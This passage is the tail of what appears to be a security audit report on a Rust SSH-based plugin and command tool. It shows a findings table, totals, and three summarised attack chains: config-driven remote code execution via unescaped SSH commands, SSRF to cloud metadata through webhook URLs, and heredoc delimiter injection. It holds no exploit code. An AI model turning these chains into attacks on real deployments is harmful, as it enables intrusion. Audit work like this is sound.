| SA-109 | Medium | Input Validation | `commands.rs:854` |
| SA-110 | Low | Input Validation | `commands.rs:526` |
| SA-111 | Low | Info Disclosure | `ssh.rs:59` |
| SA-112 | Low | Info Disclosure | `commands.rs` (multiple) |
| SA-113 | Low | DoS | `dispatcher.rs:98` |
| SA-114 | Low | Path Traversal | `json_store.rs:38` |

**Totals:** 27 findings (5 High, 8 Medium, 14 Low)

**Critical attack chains identified:**
1. **Config -> SSH -> Remote Code Execution:** TOML directive values -> plugin arguments -> SSH executor `execute_command` (no escaping) -> arbitrary command execution on remote hosts (SA-104 + SA-090).
2. **Config -> Webhook -> SSRF:** TOML webhook URL -> reqwest POST to arbitrary endpoints including cloud metadata (SA-092).
3. **Config -> SSH -> Heredoc Injection:** TOML directive values -> plugin file content -> SSH executor `write_file` heredoc delimiter collision -> arbitrary command execution (SA-089).
